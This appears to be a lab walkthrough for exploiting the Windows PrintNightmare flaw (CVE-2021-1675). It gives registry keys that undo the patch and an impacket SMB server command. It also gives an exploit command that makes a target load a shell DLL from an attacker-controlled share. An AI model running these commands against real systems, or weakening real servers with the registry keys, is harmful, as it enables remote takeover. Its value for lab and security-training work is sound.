# PrintNightmare (CVE-2021-1675)
## Summary

PrintNightmare is a critical vulnerability that allows an attacker to obtain remote code execution and/or privilege escalation against any target Windows machine using the Spooler service that is enabled by default. While Microsoft has issued a patch for this vulnerability, if a few registry keys are present, then the target will still be vulnerable despite having the patch.

## Prerequisites

Either a Windows server that doesn't have the patch released on July 1st, 2021, or must have some special registry keys added. Further, some form of SMB server and a custom compiled DLL is required to exploit this vulnerability.

## Setup

Once the server is installed, and *if* the server contains the patch, then the following registry keys need to be installed:

```registry
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\RestrictDriverInstallationToAdministrators REG_DWORD 0x0
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall REG_DWORD 0x1
```

![registry entries](./images/Pasted%20image%2020230606093107.png)

## Execution

### Method 1 - Cube0x0's Repo

Clone [Cube0x0's repo](https://github.com/cube0x0/CVE-2021-1675)(https://github.com/cube0x0/CVE-2021-1675), as well as [this DLL repo](https://github.com/NukingDragons/DllHijacks)(https://github.com/NukingDragons/DllHijacks). Pick the DLL you want from the DLL repo and compile it on Windows, or using MinGW following the instructions in the README.

Once you have the DLL of choice compiled, and whatever listener/method of receiving or connecting to the shell configured, use impackets SMB server to host the file, and run the following commands:

```bash
impacket-smbserver -smb2support share /path/to/folder/with/DLL
```

Finally, exploit the target:

```bash
python3 CVE-2021-1675 domain.com/username:'password'@target-ip '\\your-ip\share\your.dll'
```

![successful connection](./images/Pasted%20image%2020230606100148.png)

#### Indicators of Compromise

TODO
